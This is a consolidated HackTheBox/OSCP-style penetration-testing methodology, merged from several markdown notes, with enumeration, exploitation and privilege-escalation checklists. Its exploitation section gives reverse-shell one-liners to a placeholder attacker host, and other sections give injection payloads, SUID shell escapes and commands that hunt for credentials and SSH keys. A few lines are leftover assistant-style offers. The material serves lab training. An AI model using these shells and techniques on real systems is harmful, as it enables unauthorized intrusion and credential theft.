# **Comprehensive Attacker Methodology for HackTheBox Machines**

*A generalized methodology distilled from 22+ IppSec HTB walkthroughs*

This document summarizes the **mindset, methodology, reasoning, and tool usage** common across HackTheBox machine walkthroughs. Rather than detailing steps for each box, this describes **how an attacker thinks**, **what decisions they make**, **how they gather information**, and **how they pivot toward exploitation and privilege escalation**.

---

# **1. Attacker Mindset Overview**

A successful attacker has three core habits:

### **1.1 Maintain Strict Information Discipline**

* Assume *nothing*; confirm everything.
* Track environment changes (new ports, credentials, user contexts).
* Constantly update a threat model: *Who am I? What can I see? What can I control?*

### **1.2 Move from Unknown → Known**

The attacker’s job is to convert:

* **Unknown services** → understood technologies
* **Known technologies** → attack surfaces
* **Attack surfaces** → footholds
* **Footholds** → privilege escalation paths

### **1.3 Always Ask “Why is this here?”**

When a system behaves oddly (custom service, unusual file, weird permissions), the attacker uses this question to uncover intent:

* Why is SMB open to guests?
* Why is this API exposing debug info?
* Why is this script world-writable?
* Why did I find cleartext credentials?

Abnormalities lead to exploitation.

---

# **2. High-Level Workflow (Across Almost All HTB Boxes)**

## **Phase 1: Enumeration**

The attacker’s first responsibility is to understand the target.

### **2.1 Network Enumeration**

* **Nmap full scans**

  * `nmap -sC -sV -oA scan target`
  * Full port scan when needed: `nmap -p- -T4 target`

**Why:**

* Detect services, versions, and potential misconfigurations.
* Build a profile: OS type, roles (AD, web server, mail), likely attack vectors.

**Mindset principle:**

> Tools discover services. Humans discover vulnerabilities.

### **2.2 Service Enumeration**

For each open port:

* **Web (80/443)**

  * `gobuster`, `feroxbuster` → enumerate directories
  * `nikto`/manual browsing → fingerprint frameworks
  * Look for login panels, upload areas, API endpoints, debug consoles
  * Analyze cookies, headers, JS for clues

* **SMB**

  * `smbclient -L`
  * Try anonymous access
  * Enumerate shares for configs, credentials, scripts
  * Check permissions (read/write)

* **LDAP/AD Services (Forest, Active, Blackfield)**

  * `ldapsearch`, `enum4linux-ng`, `rpcclient`
  * Enumerate domain users, groups, ACLs
  * Identify attack paths (Kerberoasting, AS-REP roast, LDAP misconfigs)

* **Databases** (MySQL, PostgreSQL, MongoDB)

  * Check for default credentials
  * Enumerate users, tables, stored procedures
  * Search for passwords or file-write functionality

**Why:**
Services reveal both the **technology stack** and **developer intent**, which often hints at the vulnerability.

---

## **Phase 2: Attack Surface Analysis**

### **2.3 Identify Vulnerabilities**

Typical categories:

* **Outdated software (Old WordPress, Tomcat, Jenkins)**
  → search CVEs
* **Misconfigurations (anonymous SMB, writable scripts)**
  → abuse trust relationships
* **Logic flaws (password resets, weak auth)**
  → bypass security
* **Injection opportunities (SQLi, LDAPi, SSTI)**
  → dump DBs, escalate privileges
* **Exposed credentials (config files, logs)**
  → pivot to services

### **2.4 Tool Choices**

Tools are not the goal—they support reasoning.

Common attacker tools:

* Recon: `nmap`, `gobuster`, `feroxbuster`
* Credential attacks: `hydra`, `hashcat`, `john`, `kerbrute`
* AD attacks: `impacket-*`, `evil-winrm`, BloodHound
* Web exploitation: Burp Suite, curl, ffuf
* Reverse shells: `nc`, `socat`, msfvenom (sparingly)
* Post exploitation: `pspy`, `linpeas`, `winPEAS`

**Why these tools?**
Each tool either:

* reduces uncertainty
* extracts hidden data
* or automates noisy tasks

---

## **Phase 3: Initial Foothold**

This is the transition from **remote enumeration** to **code execution or authenticated access**.

### Common foothold patterns across HTB:

* Command injection via web apps
* Unrestricted file upload → web shell
* Leaking credentials → SSH or RDP
* Using AD misconfig: AS-REP Roast, Kerberoast
* Exploiting misconfigured databases (file write, auth bypass)
* Abuse of password reuse across services

**Reasoning approach:**

> If credentials appear anywhere, test them everywhere.

---

## **Phase 4: Post-Exploitation & Privilege Escalation**

### **4.1 Linux PrivEsc Mindset**

Identify:

* **World-writable scripts**, cron jobs → code execution
* **Capabilities** (e.g., python with cap_setuid)
* **SUID binaries** (search: `find / -perm -4000`)
* **Credentials in configs**
* **Docker/LXC misconfig** → breakout
* **NFS root_squash disabled** → root shell
* **Kernel exploits** when environment allows

### **4.2 Windows PrivEsc Mindset**

Focus on:

* **Token impersonation (JuicyPotato/PrintSpoofer)**
* **Bad ACLs** on AD objects
* **Kerberoast / AS-REP Roast**
* **Unquoted Service Paths**
* **Privilege escalation via scheduled tasks**
* **DLL hijacking**
# Methodology — Consolidated Process

This document consolidates the `process/` folder into a single, ordered methodology reference for reconnaissance, exploitation, and privilege escalation. It combines best-practices, checklists and recommended workflows.

## Contents

- Introduction & Approach
- Enumeration Checklist
- Machine Checklist (OSCP-style flow)
- Exploitation Workflow
- Privilege Escalation Methodology
- Notes & References

---

## Introduction & Approach

This section captures the recommended learning path and mindset before attacking HTB/OSCP-style machines. Focus on foundational skills (Linux, Windows, networking), core tools, and a repeatable methodology: Enumeration → Exploitation → Privilege Escalation → Post-Exploitation.

Key learning areas:

- Linux fundamentals (filesystem, permissions, systemctl, common CLI tools, bash scripting)
- Windows fundamentals (PowerShell, services, registry, AD basics)
- Networking basics (TCP/IP, DNS, HTTP/HTTPS)
- Tools: `nmap`, `gobuster`/`ffuf`, Burp Suite, `sqlmap`, `netcat`
- Mindset: patience, curiosity, systematic note-taking

Recommended progression before intermediate/advanced boxes:

1. PortSwigger Academy — web fundamentals
2. TryHackMe — Jr PenTester pathway
3. OverTheWire (Bandit) — Linux CLI practice
4. HTB Starting Point → easy HTB boxes → medium/hard boxes

---

## Enumeration Checklist

Systematic reconnaissance and service enumeration for every machine.

### Phase 1: Host Discovery

- Ping sweep (if applicable)
- Identify target IP/hostname
- Document target OS from early probes

### Phase 2: Port Scanning

- Initial quick scan: `nmap -p- --open -T4 <target>`
- Service/version detection: `nmap -sV -sC -p <ports> -oN nmap-detailed.txt <target>`

### Phase 3: HTTP/HTTPS Enumeration

- Manual inspection (browser)
- Directory fuzzing: `gobuster`, `ffuf`, `dirsearch`
- Check `robots.txt`, `sitemap.xml`, JS files for endpoints
- Intercept traffic with Burp Suite and map parameters/endpoints

### Phase 4: SMB / FTP / DB / SSH Enumeration

- SMB: `smbclient -L //<IP>/`, `enum4linux`
- FTP: test anonymous login
- DB: attempt connections, check default creds
- SSH: banner/version checks

### Phase 5: Credential Harvesting & Vulnerability Mapping

- Search files/configs for credentials (LFI, uploads, repo files)
- Cross-reference versions with Exploit-DB / searchsploit
- Document all findings and prepare for exploitation

---

## HackTheBox Machine Checklist (OSCP-style)

Use this flow for every box — start to finish.

### Pre-Engagement

- Create machine folder and notes file
- Start VPN and confirm connectivity
- Add discovered hostnames to `/etc/hosts` as needed

### Initial Recon / Enumeration

- Run `nmap` scans and record open ports & services
- Use `gobuster`/`ffuf` for web directories
- Note any admin panels, upload endpoints, or API routes

### Identify & Exploit Foothold

- Prioritize vectors (LFI, SQLi, file upload, RCE, auth bypass)
- Validate vulnerabilities manually before automating
- Host payloads and catch reverse shells (nc, socat)
- Stabilize shells and gather initial post-exploitation info

### Post-Exploitation

- Run initial enumeration (`id`, `sudo -l`, `uname -a`, `find` for SUID)
- Search for credentials, cron jobs, writable scripts, and capabilities

### Flags & Documentation

- Capture `user.txt` and `root.txt` (or platform equivalents)
- Record full exploitation chain, commands, and evidence

---

## Exploitation Workflow

A structured approach to vulnerability testing and exploitation.

### Pre‑Exploitation

- Review enumeration and prioritize by likely impact & feasibility
- Prepare tools and shell handlers

### Vulnerability Validation

- Confirm POC, understand the input → processing → output chain
- Map what access level an exploit provides (user, service, system)

### Web Application Exploits (common)

- SQL Injection (manual tests + `sqlmap`)
- RCE via file upload, command injection, SSTI, or deserialization
- LFI leading to RCE through log poisoning or wrappers
- Unprotected functionality and auth bypasses

### System/Network Exploits

- Research CVEs with `searchsploit` and adapt PoCs
- Test misconfigurations (default creds, open shares, exposed management)

### Shell Acquisition & Stabilization

- Establish reverse/bind shell, stabilize TTY, check execution context

### Post‑Exploit Enumeration

- Enumerate user, groups, services, mounted filesystems, and network
- Locate sensitive files and escalation vectors

---

## Privilege Escalation Methodology

Techniques for escalating from an initial shell to root/SYSTEM.

### Linux Privesc (ordered checklist)

1. Information gathering: `whoami`, `id`, `sudo -l`, kernel version, container checks
2. SUID/GUID binaries: `find / -perm -4000 2>/dev/null`
3. Writable directories & scripts: look for scripts executed by root or cron
4. Sudo misconfigurations: test `sudo -l` results (wildcards, binaries that allow shell escapes)
5. Cron jobs: inspect `/etc/crontab`, `/etc/cron.d/*`, user crons
6. Capabilities: `getcap -r / 2>/dev/null`
7. Kernel exploits (last resort): research CVEs for local privilege escalation
8. Credential hunting: history files, config files, SSH keys

### Windows Privesc (ordered checklist)

1. Information gathering: `whoami /priv`, `systeminfo`, check UAC and patches
2. Service enumeration: unquoted service paths, writable service directories
3. Token abuse: SeImpersonatePrivilege and impersonation tools
4. Registry and file permissions: writable HKLM, scripts, installers
5. Scheduled tasks: check tasks running as SYSTEM or admin
6. Known CVEs & service exploits

---

## Notes, Tools & Resources

Helpful tools referenced throughout the methodology:

- `nmap`, `gobuster`/`ffuf`, `burp suite`, `sqlmap`, `netcat`, `searchsploit`
- Enumeration scripts: `linPEAS`, `winPEAS`, `LinEnum`
- Privilege escalation resources: GTFOBins, HackTricks, Exploit-DB

Guidelines

- Keep methodical notes and capture exact commands and outputs
- Prefer manual validation over blind automation
- When merging notes or archives, keep section headers like `Merged from <path>` for traceability

---

*This consolidated methodology was generated by combining the individual files in the `process/` folder. If you'd like a different section order, more detail in any area, or a TOC with internal links, tell me and I'll refine it.*


---

<!-- Merged from: approach.md on 2025-11-21T16:14:09.275846Z -->

## Merged from `approach.md`

### Approach: What to Learn Before Starting HackTheBox

This is a clear, structured roadmap of what you should learn before starting HackTheBox (HTB) machines — especially if your goal is OSCP or structured pentesting skill growth.

---

#### ✔️ 1. Core Technical Foundations

These are non-negotiable basics.

##### Linux fundamentals

- File system navigation & permissions
- System services (`systemctl`, networking tools)
- Common CLI utilities: `grep`, `sed`, `awk`, `find`, `curl`, `wget`, `nc`
- Bash scripting basics
- Package management (`apt`, `yum`)

##### Windows fundamentals

- Command Prompt & PowerShell basics
- File system & permissions
- Understanding of services, registry, scheduled tasks
- Basic Active Directory concepts (users, groups, domains)

##### Networking fundamentals

- TCP/IP, ports, protocols
- DNS, HTTP/HTTPS
- Subnetting & routing (just enough to know what you’re seeing in scans)
- Firewall behavior basics

---

#### ✔️ 2. Pentesting Methodology (OSCP-style)

Before touching machines, learn the process.

##### Enumeration → Exploitation → Privilege Escalation → Post-Exploitation

- How to enumerate thoroughly
- How to keep notes
- How to pivot when something doesn’t work
- How to escalate in both Linux & Windows environments

---

#### ✔️ 3. Tools You Must Be Comfortable With

These tools appear in nearly every HTB machine.

##### Scanning & Enumeration

- `nmap` (aggressive scan, scripts, service detection)
- `nikto`, `gobuster`/`ffuf`, `dirsearch`

##### Web exploitation basics

- Understanding HTTP requests
- Burp Suite (proxy, repeater, intruder)
- Manual testing of parameters

##### Exploitation

- Metasploit (optional for OSCP, useful for HTB)
- `msfvenom` payloads
- Netcat / Socat / SSH tricks
- Reverse shell stabilisation (pty, `stty`, python)

##### Scripting

- Using Python, bash, or PowerShell to automate small tasks
- Writing simple PoC scripts

---

#### ✔️ 4. Common Vulnerabilities You Should Understand

HTB machines heavily rely on these categories.

##### Web vulns

- Command injection
- File uploads
- LFI/RFI
- SQLi
- XSS (mostly for foothold)
- SSRF
- Path traversal
- Authentication bypass techniques

##### System vulns

- SUID binaries
- Cron jobs
- PATH hijacking
- Capabilities
- Kernel exploits (less common now)

##### Windows vulns

- Misconfigured services
- Privilege escalation shortcuts like:
  - Unquoted service paths
  - Weak permissions
  - UAC bypass
  - Token abuse
  - Exploitable scheduled tasks
- Basic AD privesc:
  - Kerberoasting
  - AS-REP roasting
  - Pass-the-Hash
  - Bloodhound enumeration

---

#### ✔️ 5. Exploit Research Skills

Before attacking real HTB machines, you should know how to:

- Search Exploit-DB and adapt exploits
- Patch broken PoC scripts
- Modify Python2 → Python3
- Understand CVE write-ups well enough to replicate manually

---

#### ✔️ 6. Privilege Escalation Knowledge (Huge part of HTB)

##### Linux Privesc

- SUID enumeration
- `sudo` misconfigurations
- Crontab jobs
- Capabilities (`getcap -r /`)
- PATH hijacking
- File permissions misconfigurations
- Docker/LXC escapes

##### Windows Privesc

- `winPEAS` / `seatbelt`
- Privileges (SeImpersonatePrivilege, etc.)
- Service permissions (`sc qc`, `accesschk`)
- Registry permissions
- PowerShell privesc methods
- Basic AD privesc path-building

---

#### ✔️ 7. Note-Taking & Documentation

Learn one note system and stick to it:

- Obsidian
- CherryTree
- Notion
- OneNote
- Markdown + Sublime

Record:

- Each enumeration step
- Commands used
- Service versions
- Possible exploitation vectors
- Credentials found
- Privilege escalation findings

Good notes = faster rooting in future machines.

---

#### ✔️ 8. Mental Approach to CTF/Pentesting

HTB machines require:

- Patience
- Curiosity
- Ability to research effectively
- Willingness to try multiple approaches
- Logical elimination of dead ends

Many people quit early because they expect HTB to be like a textbook — it is not. It’s puzzle-based pentesting.

---

#### ✔️ 9. Early Training Before HTB

These platforms are perfect warm-ups:

##### Beginner Platforms

- PortSwigger Web Academy
- TryHackMe (complete “Jr Penetration Tester” and “Offensive Pentesting”)
- VulnHub “OSCP-style” machines
- OverTheWire Bandit (Linux CLI training)

Once you’re comfortable, move to:

##### HTB Starting Point + Tier 0/1

This is where things start to feel like real OSCP exercises.

---

#### ✔️ 10. Recommended order before doing HTB intermediate/advanced boxes

1. PortSwigger → Learn core web vulns
2. TryHackMe → Do Jr PenTester pathway
3. OverTheWire → Do Bandit
4. HTB Starting Point → Very easy machines
5. HTB Easy machines → Build confidence
6. HTB Medium/Hard machines → OSCP-level challenge

---

#### Extras — Options I can prepare for you

If you want, I can also create:

- A personalized study roadmap based on your current level
- A checklist you follow during every HTB machine
- A daily practice plan leading up to OSCP

Tell me which one you want next and I’ll generate it.


---

<!-- Merged from: checklist.md on 2025-11-21T16:14:09.275846Z -->

## Merged from `checklist.md`

### ✅ HackTheBox Machine Checklist (OSCP-style)

**Use this exact flow for every box — easy, medium, hard.**

---

### 1️⃣ Pre-Engagement Setup

- [ ] Create a machine folder: `mkdir HTB/<machine>`
- [ ] Start a notes file (Obsidian/Markdown/CherryTree)
- [ ] Start machine VPN connection (`openvpn <file>.ovpn`)
- [ ] Ping target → confirm active
- [ ] Add target to `/etc/hosts` if hostname discovered later

---

### 2️⃣ Initial Recon / Enumeration

##### 🔍 **Nmap Scan**

- [ ] Run full TCP scan:

```
nmap -sV -sC -oN nmap_initial <IP>
```

- [ ] Run full port scan if needed:

```
nmap -p- -T4 --min-rate 5000 -oN nmap_full <IP>
```

- [ ] Record all open ports, versions, OS guesses
- [ ] Identify potential attack surfaces

  - Web servers
  - Database ports
  - SMB, SSH, FTP, RDP
  - RPC, WinRM, SNMP
  - High or unusual ports

---

### 3️⃣ Service Enumeration (per port)

##### 🌐 **If Web ports (80/443/etc)**

- [ ] Visit site manually and note functionality
- [ ] Use **gobuster/ffuf** for directory brute force
- [ ] Look for hidden paths
- [ ] Check robots.txt, sitemap.xml
- [ ] Intercept traffic with Burp Suite
- [ ] Enumerate parameters (use Param Miner if allowed)
- [ ] Run nikto if relevant (`nikto -h <IP>`)

##### 📁 **If SMB (445/139)**

- [ ] `smbclient -L //<IP>/`
- [ ] Try null or guest logins
- [ ] Enumerate shares

##### 🗂 **If FTP**

- [ ] Try anonymous login
- [ ] Mirror files if allowed

##### 📡 **If SSH/WinRM/RDP**

- [ ] Look for weak creds
- [ ] Note banner versions
- [ ] Prepare for bruteforcing only if ethically permitted (HTB usually allows)

##### 🧬 **If Database Ports**

- [ ] MySQL → test root/no password
- [ ] PostgreSQL → test default creds
- [ ] MongoDB → check for unauth access
- [ ] Redis → test `redis-cli -h <IP>`

---

### 4️⃣ Identify & Exploit Foothold

##### 🔎 Search for vulnerabilities

- [ ] Search Exploit-DB for version-specific vulns
- [ ] Google unusual strings, headers, CMS versions
- [ ] Check for:

  - LFI/RFI
  - SQL injection
  - Command Injection
  - SSRF
  - File Upload misconfigurations
  - Deserialization
  - Weak authentication
  - Misconfigured API endpoints

##### 🧪 Test manually

- [ ] Parameter tampering (via Burp)
- [ ] Try basic payloads
- [ ] Upload tests (double extension, bypasses)
- [ ] URL manipulation

##### 🛠 Exploitation

- [ ] Run PoCs but analyze code first (never blindly run)
- [ ] Modify Python2 → Python3 if needed
- [ ] Host payloads using python HTTP server
- [ ] Catch reverse shell (nc/socat)
- [ ] Stabilize shell:

```
python3 -c 'import pty; pty.spawn("/bin/bash")'
CTRL+Z
stty raw -echo; fg
export TERM=xterm
```

---

### 5️⃣ Post-Exploitation Enumeration (Once Foothold Gained)

##### 🐧 Linux

- [ ] Check user, groups, sudo:

```
id
sudo -l
```

- [ ] Enumerate system:

```
uname -a
lsb_release -a
```

- [ ] Search for sensitive files:

```
find / -perm -4000 2>/dev/null
ls -la /home
```

- [ ] Look for credentials:

  - .bash_history
  - config files
  - cron jobs
  - backups
  - NFS mounts
- [ ] Check capabilities:

```
getcap -r / 2>/dev/null
```

##### 🪟 Windows

- [ ] Run winPEAS / PowerUp
- [ ] Check privileges:

```
whoami /priv
```

- [ ] Enumerate services:

```
sc qc <service>
```

- [ ] Registry enumeration
- [ ] Search for creds:

  - unattended.xml
  - files in Desktop/Documents
  - config files
- [ ] Token impersonation (if allowed)

---

### 6️⃣ Privilege Escalation

##### Linux Privesc Vectors

- [ ] SUID binaries
- [ ] Misconfigured sudo (`sudo -l`)
- [ ] Cron jobs or scripts writable
- [ ] PATH hijacking
- [ ] Capabilities
- [ ] Exploitable services
- [ ] Docker/LXC breakout
- [ ] Kernel exploit (rare but possible on HTB)

##### Windows Privesc Vectors

- [ ] Unquoted service paths
- [ ] Weak service binaries permissions
- [ ] Modifiable registry autoruns
- [ ] Token impersonation (SeImpersonatePrivilege)
- [ ] Scheduled tasks
- [ ] Stored credentials in files

---

### 7️⃣ Flags & Proof Collection

- [ ] Read `user.txt`
- [ ] Read `root.txt`
- [ ] Save paths to both flags in notes
- [ ] Confirm flags match HTB panel
- [ ] (Optional) Capture screenshots for documentation

---

### 8️⃣ Cleanup (Good Practice)

- [ ] Remove uploaded payloads
- [ ] Remove temporary accounts (if created)
- [ ] Remove logs **only if allowed** (HTB resets anyway)

---

### 9️⃣ Documentation

Record:

- Nmap results
- Vulnerabilities found
- Exploitation steps
- Privesc method
- Payloads used
- Commands used
- Files accessed
- Final flags

This becomes your personal knowledge base.


---

<!-- Merged from: enumeration.md on 2025-11-21T16:14:09.275846Z -->

## Merged from `enumeration.md`

### Enumeration Checklist

Systematic reconnaissance and service enumeration for HackTheBox machines.

#### Phase 1: Host Discovery

- [ ] Ping sweep (if network-based)
- [ ] Identify target IP/hostname
- [ ] Document target OS (Linux/Windows) from context or early probes

#### Phase 2: Port Scanning

- [ ] Run initial quick scan: `nmap -p- --open -T4 <target>`
- [ ] Identify open ports and services
- [ ] Note common ports: 22 (SSH), 80 (HTTP), 443 (HTTPS), 445 (SMB), 3306 (MySQL), 5432 (PostgreSQL), 8080 (HTTP alt), etc.

#### Phase 3: Service Version Detection

- [ ] Run service scan: `nmap -sV -p <ports> <target>`
- [ ] Identify service versions for vulnerability mapping
- [ ] Run script scan: `nmap -sC -p <ports> <target>` (if time allows)
- [ ] Combine into detailed scan: `nmap -sV -sC -p <ports> -oN nmap-detailed.txt <target>`

#### Phase 4: HTTP/HTTPS Enumeration

- [ ] Check HTTP status: `curl -i http://<target>`
- [ ] Run web spider/crawler:
  - Burp Suite: Automatic crawl
  - ffuf: `ffuf -u http://<target>/FUZZ -w /path/to/wordlist`
  - dirsearch: `dirsearch -u http://<target> -w common.txt`
- [ ] Enumerate common directories: `/admin`, `/app`, `/api`, `/uploads`, `/backup`, `/config`, etc.
- [ ] Identify technologies (check response headers, HTML, JavaScript)
- [ ] Document endpoints, parameters, forms

#### Phase 5: SMB Enumeration (if SMB present)

- [ ] List shares: `smbclient -L //<target>`
- [ ] Enumerate shares for null sessions: `smbclient //<target>/share -N`
- [ ] Run enum4linux or nmap smb scripts
- [ ] Check for known CVEs (EternalBlue, etc.)

#### Phase 6: SSH Enumeration (if SSH present)

- [ ] Check SSH version: `ssh -v <target>`
- [ ] Identify SSH software (OpenSSH version for known CVEs)
- [ ] Note: SSH is often a secondary access vector; focus on other services first

#### Phase 7: Database Enumeration (if DB present)

- [ ] Attempt connection: `mysql -h <target> -u root` or similar
- [ ] Identify database service (MySQL, PostgreSQL, MSSQL, etc.)
- [ ] Check for default credentials
- [ ] Enumerate databases/tables if accessible

#### Phase 8: Credential Harvesting

- [ ] Check common locations: `/etc/passwd`, `/etc/shadow` (via LFI), config files
- [ ] Look for hardcoded credentials in code/config files
- [ ] Check for weak default credentials on services
- [ ] Use tools: `hashcat`, `john` for offline cracking if hashes found

#### Phase 9: Vulnerability Identification

- [ ] Cross‑reference service versions with known CVEs (searchsploit, Exploit-DB)
- [ ] Test for common web vulnerabilities:
  - SQL Injection (SQLi)
  - Cross‑Site Scripting (XSS)
  - Local File Inclusion (LFI)
  - Remote Code Execution (RCE)
  - Path Traversal
  - Unprotected functionality
  - CSRF, XXE, SSRF, etc.
- [ ] Identify misconfigurations

#### Phase 10: Documentation

- [ ] Document all open ports, services, versions
- [ ] Record interesting findings (default credentials, interesting endpoints, potential vulnerabilities)
- [ ] Capture screenshots/outputs
- [ ] Prepare for exploitation phase

#### Tools Reference

- **nmap** – Port scanning & service detection
- **ffuf** – Web directory/parameter fuzzing
- **burp suite** – Web proxy & analysis
- **enum4linux** – SMB enumeration
- **curl/wget** – Manual HTTP testing
- **dirsearch** – Directory enumeration
- **nikto** – Web server scanning (optional)

#### Notes

- Start broad (all ports), then narrow down (specific services).
- Document everything; early findings may connect to later vectors.
- Prioritize services with known public exploits.
- Never assume a service is uninteresting until tested.


---

<!-- Merged from: exploitation.md on 2025-11-21T16:14:09.275846Z -->

## Merged from `exploitation.md`

### Exploitation Workflow

Systematic approach to vulnerability testing and exploitation for HackTheBox machines.

#### Pre‑Exploitation Setup

- [ ] Review enumeration results
- [ ] Identify top vulnerability candidates (prioritize by CVSS, popularity, ease)
- [ ] Prepare tools: Burp Suite, Metasploit (if allowed), manual exploit code
- [ ] Set up shell handlers (nc, bash, meterpreter)

#### Phase 1: Vulnerability Validation

- [ ] Confirm vulnerability exists (POC or manual test)
- [ ] Understand the vulnerability chain (input → processing → output)
- [ ] Identify what access level it grants (user, service account, system)

#### Phase 2: Exploitation Techniques

##### Web Application Exploits

- **SQL Injection (SQLi)**
  - Test parameter: `' OR '1'='1`, `' UNION SELECT ...`, time‑based blind, error‑based
  - Use sqlmap: `sqlmap -u "url" --data "params" --dbs`
  - Extract usernames/passwords, read files, execute commands

- **Remote Code Execution (RCE)**
  - Upload shells: PHP, JSP, ASP, etc.
  - Command injection: `; whoami`, `| id`, `$(command)`
  - Template injection: SSTI, JSTL, Thymeleaf
  - Deserialization exploits (Java, Python, .NET)

- **Local File Inclusion (LFI)**
  - Path traversal: `../../../etc/passwd`
  - Log poisoning to achieve RCE (LFI + write capability)
  - Read sensitive files: `/etc/passwd`, `/etc/shadow`, config files, SSH keys

- **Unprotected Functionality**
  - Access admin panels without authorization
  - Bypass authentication or authorization checks
  - Perform privileged actions

##### System/Network Exploits

- **Known CVEs**
  - Research: `searchsploit <service> <version>`, Exploit-DB, GitHub
  - Download/adapt exploits
  - Test against target

- **Misconfigurations**
  - Default credentials
  - Open SMB shares
  - Exposed management interfaces
  - Weak permissions

- **Service‑Specific Exploits**
  - SMB: EternalBlue (MS17‑010), nullsessions
  - SSH: Version exploits, key extraction
  - FTP: Anonymous upload/download
  - DNS: Zone transfers, cache poisoning

#### Phase 3: Shell Acquisition

- [ ] Establish reverse shell or bind shell
- [ ] Stabilize shell (interactive, TTY if possible)
- [ ] Confirm command execution (whoami, id, pwd)
- [ ] Check for shell restrictions (AppArmor, SELinux, etc.)

##### Common Shell Methods

```bash
### Bash reverse shell
bash -i >& /dev/tcp/attacker-ip/port 0>&1

### Python
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("attacker-ip",port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"])'

### nc listener
nc -lvnp port
```

#### Phase 4: Post‑Exploitation (Initial Access)

- [ ] Enumerate current user and groups
- [ ] List available files and directories
- [ ] Identify sensitive files (config, credentials, SSH keys)
- [ ] Check for other users or services
- [ ] Map network interfaces and neighbors

#### Phase 5: Privilege Escalation

See `privilege-escalation.md` for detailed techniques.

- [ ] Identify privesc vector (kernel exploit, SUID binary, sudo, cron jobs, etc.)
- [ ] Gain higher privileges (root/SYSTEM)
- [ ] Capture root/system flag

#### Documentation During Exploitation

- Record the exact vulnerability or chain of vulnerabilities
- Document commands and outputs
- Capture proof (flags, /etc/passwd, etc.)
- Note any obstacles or unexpected behaviors

#### Tools Reference

- **Burp Suite** – Web vulnerability testing, request manipulation
- **SQLMap** – Automated SQL injection testing
- **Metasploit** – Multi‑protocol exploitation framework
- **searchsploit** – Local exploit database search
- **curl/wget** – Manual HTTP requests
- **netcat (nc)** – Shell handler, networking
- **Python/Bash** – Custom exploit/payload scripting

#### Common Pitfalls

- Skipping enumeration; not understanding the service/app fully
- Using exploits without understanding how they work
- Not checking for WAF/IDS/filtering
- Assuming credentials are invalid without proper testing
- Not testing with different HTTP methods (GET, POST, PUT, DELETE)

#### Notes

- Always prefer understanding over blind exploitation.
- Adapt exploits to the target; public exploits may need modification.
- Keep payloads simple and test iteratively.
- Document failures; they often reveal the correct path.


---

<!-- Merged from: privilege-escalation.md on 2025-11-21T16:14:09.275846Z -->

## Merged from `privilege-escalation.md`

### Privilege Escalation Methodology

Techniques and checklist for escalating from initial shell to root/SYSTEM on HackTheBox machines.

#### Linux Privilege Escalation

##### Phase 1: Information Gathering

- [ ] Current user: `whoami`, `id`
- [ ] User groups: `groups`
- [ ] Sudoers file: `sudo -l` (with/without password)
- [ ] System info: `uname -a`, `cat /etc/os-release`
- [ ] Kernel version (search for exploits)
- [ ] Check if running in container: `cat /proc/1/cgroup`, `/.dockerenv`

##### Phase 2: SUID/GUID Binaries

- [ ] Find SUID binaries: `find / -perm -4000 2>/dev/null`
- [ ] Find GUID binaries: `find / -perm -2000 2>/dev/null`
- [ ] Check if common binaries are SUID (cp, find, tar, etc.)
- [ ] Test for exploitation:
  - Unbounded command execution: `find . -exec /bin/sh \;`
  - Library path manipulation: `LD_LIBRARY_PATH`, `LD_PRELOAD`
  - Wildcard exploitation (tar, rsync with `*`)

##### Phase 3: Writable Directories & Files

- [ ] World-writable directories: `find / -type d -perm -002 2>/dev/null`
- [ ] Check `/tmp`, `/var/tmp`, `/dev/shm` for write permissions
- [ ] Identify scripts/binaries in writable locations that run as higher privilege
- [ ] Replace or modify files to execute malicious code

##### Phase 4: Sudo Abuse

- [ ] `sudo -l` – check what can be run without password
- [ ] Common targets:
  - `sudo chmod` – modify permissions
  - `sudo cp` – copy files (overwrite root files)
  - `sudo find` / `sudo tar` – command injection via `-exec`
  - `sudo python/ruby/perl` – run arbitrary code
  - `sudo less/more/vi` – shell escape (e.g., `:!sh`)
  - `sudo *` (all commands) – immediate root
- [ ] Test wildcard sudo rules: `sudo /path/to/*` might allow arbitrary path

##### Phase 5: Cron Jobs

- [ ] Check system cron: `cat /etc/crontab`, `/etc/cron.d/*`
- [ ] Check user crons: `crontab -l`, `/var/spool/cron/crontabs/*` (root)
- [ ] Identify high-privilege cron jobs
- [ ] Look for:
  - Scripts in writable directories
  - Wildcard usage in commands
  - Predictable file paths (no full path specified)
- [ ] Exploitation: create malicious script in cron path or modify existing cron script

##### Phase 6: Capability Abuse

- [ ] Check file capabilities: `getcap -r / 2>/dev/null`
- [ ] Common dangerous capabilities:
  - `cap_setuid` – set UID to 0 (root)
  - `cap_dac_override` – bypass file permissions
  - `cap_sys_admin` – namespace escape (containers)
- [ ] Example: `/bin/ping` with `cap_net_raw` can be chained with other exploits

##### Phase 7: Kernel Exploits

- [ ] Identify kernel version: `uname -r`
- [ ] Search for known CVEs: `searchsploit linux kernel <version>`
- [ ] Common exploits:
  - CVE-2016-5195 (Dirty COW) – write to read-only files
  - CVE-2021-3493 (OverlayFS) – privilege escalation
  - CVE-2019-14287 (Sudo) – bypass sudo restrictions
- [ ] Compile and run exploit (if available/allowed)
- [ ] Requires caution: may crash system or cause stability issues

##### Phase 8: Password/Credential Hunting

- [ ] Search for password files: `grep -r "password" /home /etc /var/www 2>/dev/null`
- [ ] Check shell history: `cat ~/.bash_history`, `~/.zsh_history`
- [ ] Look for SSH keys: `find / -name "id_rsa" 2>/dev/null`
- [ ] Check for .aws, .ssh, .config directories
- [ ] Read config files in `/etc` (mysql, apache, nginx, etc.)

##### Phase 9: NFS Shares

- [ ] Check NFS exports: `showmount -e <target>` (from attacker)
- [ ] Mount NFS shares: `mount -t nfs <target>:/path /mnt/local`
- [ ] Check for root_squash bypass or missing root_squash
- [ ] Create SUID binary in NFS and execute as target user

##### Phase 10: Container Escape (if in container)

- [ ] Detect container: `cat /.dockerenv`, cgroup checks
- [ ] Check for mounted host filesystem
- [ ] Look for privileged capabilities or insecure Docker socket
- [ ] Escape via cgroup, namespace, or privileged container configurations

#### Windows Privilege Escalation

##### Phase 1: Information Gathering

- [ ] Current user: `whoami`, `whoami /priv`
- [ ] User groups: `net user %username%`, `whoami /groups`
- [ ] System info: `systeminfo`, `wmic os get caption`
- [ ] Check UAC: `wmic UAC Get /Format:list`
- [ ] Check for patches: `wmic qfe list brief full` or `Get-HotFix`

##### Phase 2: Service Exploitation

- [ ] List services: `wmic service list brief`, `sc query`
- [ ] Check service paths for unquoted path vulnerability: `wmic service get name,pathname | findstr /V "C:\Windows"`
- [ ] Test write permissions to service directories
